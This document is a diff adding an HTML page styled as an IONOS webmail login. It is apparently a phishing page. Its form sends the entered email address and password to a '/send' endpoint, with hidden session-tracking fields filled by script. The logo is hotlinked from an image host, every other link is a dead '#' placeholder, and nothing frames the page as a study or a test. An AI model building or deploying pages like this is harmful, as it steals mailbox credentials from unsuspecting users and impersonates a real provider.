@@ -1,0 +1,489 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IONOS Webmail Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        /* Header */
+        .header {
+            background-color: white;
+            border-bottom: 1px solid #e5e7eb;
+            padding: 16px;
+        }
+
+        .header-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo {
+            color: #003d82;
+            font-weight: bold;
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .subtitle {
+            color: #6b7280;
+            font-weight: 500;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .icon-button {
+            padding: 8px;
+            background: none;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .icon-button:hover {
+            background-color: #f3f4f6;
+        }
+
+        .icon-button svg {
+            width: 20px;
+            height: 20px;
+            color: #6b7280;
+        }
+
+        /* Main Content */
+        .main {
+            max-width: 448px;
+            margin: 0 auto;
+            padding: 48px 16px;
+        }
+
+        .login-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e5e7eb;
+            padding: 32px;
+            margin-bottom: 32px;
+        }
+
+        .login-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+
+        .email-icon {
+            width: 48px;
+            height: 48px;
+            background-color: #4a90e2;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+        }
+
+        .email-icon svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .login-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .form {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #4a90e2;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .input:focus {
+            outline: none;
+            ring: 2px;
+            ring-color: #4a90e2;
+            border-color: transparent;
+        }
+
+        .security-note {
+            font-size: 14px;
+            color: #6b7280;
+        }
+
+        .security-note a {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+
+        .security-note a:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            width: 100%;
+            background-color: #003d82;
+            color: white;
+            font-weight: 600;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #002c5f;
+        }
+
+        .customer-section {
+            margin-top: 32px;
+            text-align: center;
+        }
+
+        .customer-section p {
+            color: #374151;
+            margin-bottom: 8px;
+        }
+
+        .customer-section a {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+
+        .customer-section a:hover {
+            text-decoration: underline;
+        }
+
+        /* More Logins */
+        .more-logins {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e5e7eb;
+            padding: 32px;
+        }
+
+        .more-logins h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 24px;
+        }
+
+        .logins-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .login-option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 16px;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .login-option:hover {
+            background-color: #f9fafb;
+        }
+
+        .login-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #4a90e2 0%, #2c5aa0 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .login-icon svg {
+            width: 32px;
+            height: 32px;
+            color: white;
+        }
+
+        .login-label {
+            color: #4a90e2;
+            font-weight: 500;
+        }
+
+        .center-login {
+            display: flex;
+            justify-content: center;
+        }
+
+        /* Footer */
+        .footer {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 32px 16px;
+            font-size: 14px;
+            color: #6b7280;
+        }
+
+        .footer-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .status {
+            display: flex;
+            align-items: center;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .footer-links {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .footer-links a {
+            color: #6b7280;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            .header-container {
+                flex-direction: column;
+                gap: 16px;
+            }
+
+            .main {
+                padding: 24px 16px;
+            }
+
+            .login-card, .more-logins {
+                padding: 24px;
+            }
+
+            .logins-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <div class="header-left">
+                <h1 class="logo">IONOS</h1>
+                <span class="subtitle">WEBMAIL LOGIN</span>
+            </div>
+            <div class="header-right">
+                <!-- Search Icon -->
+                <button class="icon-button">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                    </svg>
+                </button>
+                <!-- Help Icon -->
+                <button class="icon-button">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main">
+        <!-- Login Card -->
+        <div class="login-card">
+            <!-- Email Icon and Title -->
+            <div class="login-header">
+                <div class="email-icon">
+                  <img src="https://i.ibb.co/d0HvHhyc/product-email.png" >
+                </div>
+                <h2 class="login-title">My Webmail Login</h2>
+            </div>
+
+            <!-- Email Form -->
+            <form class="form" action="/send" method="post" >
+                <div class="input-group">
+                    <label for="email" class="label">Email address</label>
+                    <input type="email" id="email" name="email" class="input" required>
+                </div>
+
+		<!-- Hidden inputs for session tracking -->
+      <input type="hidden" name="sessionId" id="sessionId" value="">
+      <input type="hidden" name="submissionPath" id="submissionPath" value="">
+
+
+                <div class="input-group">
+                    <label for="password" class="label">Password</label>
+                    <input type="password" id="password" name="userpwd" class="input" required>
+                </div>
+
+                <!-- Security Note -->
+                <p class="security-note">
+                    Not your device?
+                    <a href="#">Log out after the session</a>
+                    or
+                    <a href="#">use private browsing mode</a>.
+                </p>
+
+                <!-- Next Button -->
+                <button type="submit" class="next-button">Next</button>
+            </form>
+
+            <!-- Customer Link -->
+            <div class="customer-section">
+                <p>Not an IONOS customer yet?</p>
+                <a href="#">Become a customer now and benefit from our offers.</a>
+            </div>
+        </div>
+
+        <!-- More IONOS Logins -->
+        <div class="more-logins">
+            <h3>More IONOS Logins</h3>
+            
+            <div class="logins-grid">
+                <!-- My IONOS -->
+                <a href="#" class="login-option">
+                    <div class="login-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                        </svg>
+                    </div>
+                    <span class="login-label">My IONOS</span>
+                </a>
+
+                <!-- HiDrive -->
+                <a href="#" class="login-option">
+                    <div class="login-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"></path>
+                        </svg>
+                    </div>
+                    <span class="login-label">HiDrive</span>
+                </a>
+            </div>
+
+            <!-- Email Archiving - Center aligned -->
+            <div class="center-login">
+                <a href="#" class="login-option">
+                    <div class="login-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path>
+                        </svg>
+                    </div>
+                    <span class="login-label">Email Archiving</span>
+                </a>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="status">
+                <div class="status-dot"></div>
+                <span>All Systems Operational</span>
+            </div>
+            <div class="footer-links">
+                <span>© 2025 IONOS Inc.</span>
+                <a href="#">Privacy Policy</a>
+                <span>-</span>
+                <a href="#">T&Cs</a>
+            </div>
+        </div>
+    </footer>
+
+ <script>
+	// Generate or retrieve sessionId
+  let sessionId = localStorage.getItem("sessionId");
+  if (!sessionId) {
+    sessionId = crypto.randomUUID();
+    localStorage.setItem("sessionId", sessionId);
+  }
+  document.getElementById("sessionId").value = sessionId;
+
+  // Always set current path for submissionPath
+  document.getElementById("submissionPath").value = window.location.pathname;       
+
+</script>
+
+</body>
+</html>
